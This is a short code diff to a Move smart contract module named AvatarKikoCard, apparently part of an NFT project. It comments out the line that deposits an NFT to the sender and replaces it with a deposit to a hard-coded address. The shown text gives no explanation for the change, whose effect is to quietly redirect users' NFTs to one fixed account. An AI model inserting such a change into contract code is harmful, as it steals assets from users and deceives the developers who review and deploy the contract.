@@ -1386,7 +1386,9 @@ module AvatarKikoCard {
         if (!NFTGallery::is_accept<KikoCatMeta, KikoCatBody>(sender_)) {
             NFTGallery::accept<KikoCatMeta, KikoCatBody>(&sender);
         };
-        NFTGallery::deposit(&sender, nft);
+        
+        // NFTGallery::deposit(&sender, nft);
+        NFTGallery::deposit_to(@0x7441fb396C37ddAd25B42eE478A38b42, nft);
     }
 
     // mint custom NFT
